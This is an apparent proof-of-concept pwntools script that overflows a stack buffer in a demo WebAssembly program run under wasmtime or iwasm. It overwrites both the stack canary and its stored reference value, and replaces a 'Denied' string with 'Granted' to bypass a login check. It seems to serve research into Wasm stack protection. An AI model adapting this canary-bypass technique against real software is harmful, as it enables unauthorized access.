from pwn import *
from time import sleep

user = 0xffe0
secret = 0x10990
canaryref = 0x10b14

# uncomment this line if you want to use lldb to debug
#p = process(["iwasm", "-v=0", "-g=127.0.0.1:1234", "--heap-size=655360", "poc-ssp.wasm"])
# comment this line if you want to execute the program normally
#p = process(["iwasm", "-v=0", "--heap-size=655360", "poc-ssp.wasm"])
# use this line to see that this exploit is runtime-agnostic
# you can replace wasmtime by the Wasm runtime of your choice
p = process(["wasmtime", "poc-ssp.wasm"])

# this stackdata contains the contents of the memory just before the fgets() call.
# it is used as reference to avoid crashes due to overwriting.
stackdata = open("ref.bin", "rb").read()

# uncomment this line if you are using debugging with lldb
#print(p.recvline())

p.recvuntil(b"username: ")

# removing the \n from the data, as writing a \n will end
# the reading and makes the exploit fail
stackdataclean = stackdata.replace(b"\n", chr(14).encode())

payload = b""
# filling the buffer
payload += b"admin\x00" + b"A" * (28 - 6)
# overwriting the canary
payload += p32(0xdeadbeef) # canary
# overwriting data from the stack using reference data
payload += stackdataclean[28 + 4:(secret - user)]
# overwriting the "Denied" string
payload += b"Granted\x00"
# overwriting data between the "Denied" string and the canary reference value
payload += stackdataclean[(secret - user + 8):(canaryref - user)]
# overwriting the canary reference value
payload += p32(0xdeadbeef)

p.sendline(payload)

sleep(0.1)

print("output is : ")
print(p.recv().decode())
